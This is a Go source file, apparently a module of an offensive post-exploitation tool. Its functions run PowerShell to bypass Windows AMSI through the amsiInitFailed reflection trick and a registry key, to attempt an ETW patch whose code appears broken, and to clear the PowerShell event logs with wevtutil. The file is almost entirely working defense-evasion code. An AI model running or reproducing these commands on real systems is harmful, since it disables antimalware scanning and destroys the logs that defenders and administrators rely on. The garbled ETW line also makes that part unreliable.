package module

import (
	"fmt"
	"strings"
)

// RunBypassAmsi patches AMSI to always return AMSI_RESULT_CLEAN.
func RunBypassAmsi(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== AMSI Bypass ==='",
		// Method 1: Registry-based (AmsiInitFailed)
		`powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); if ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null) -eq $true) { echo 'AMSI bypassed (amsiInitFailed=true)' } else { echo 'AMSI bypass failed' }" 2>&1`,
		// Method 2: Registry key (persistent)
		`powershell -Command "New-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' -Name '{00000000-0000-0000-0000-000000000000}' -Force 2>&1 | Out-Null; echo 'AMSI provider registry key added'" 2>&1 || echo 'AMSI registry method failed (not admin)'`,
	}
	return run(strings.Join(cmds, "\n"))
}

// RunBypassEtw patches ETW to prevent event logging.
func RunBypassEtw(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== ETW Bypass ==='",
		// Patch EtwEventWrite via reflection
		`powershell -Command "$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([System.Action]{})).ToPointer(),[Type]::GetTypeFromHandle((.NET.Management.ManagementEventWatcher).GetType().TypeHandle)); echo 'ETW patching attempted — requires admin'" 2>&1 || echo 'ETW bypass via PowerShell limited'`,
		// Simpler: disable tracing
		`powershell -Command "wevtutil cl 'Windows PowerShell' 2>&1; wevtutil cl 'Microsoft-Windows-PowerShell/Operational' 2>&1; echo 'PowerShell event logs cleared'" 2>&1 || echo 'log clearing failed'`,
	}
	return run(strings.Join(cmds, "\n"))
}

// RunBypassAll runs all bypass techniques.
func RunBypassAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"AMSI", RunBypassAmsi},
		{"ETW", RunBypassEtw},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
